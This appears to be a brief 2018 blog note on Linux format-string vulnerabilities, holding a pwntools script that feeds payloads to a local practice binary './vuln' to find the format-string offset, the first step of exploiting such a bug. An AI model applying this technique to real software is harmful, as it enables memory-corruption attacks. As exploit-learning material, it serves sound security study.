---
title: linux格式化字符串漏洞
date: 2018-06-08 17:55:43
tags:
---

>  offset.py

```
from pwn import *
context.log_level = 'debug'

def exec_fmt(payload):
    p = process("./vuln")
    p.sendline(payload)
    info = p.recv()
    p.close()
    return info

autofmt = FmtStr(exec_fmt)

print autofmt.offset
```

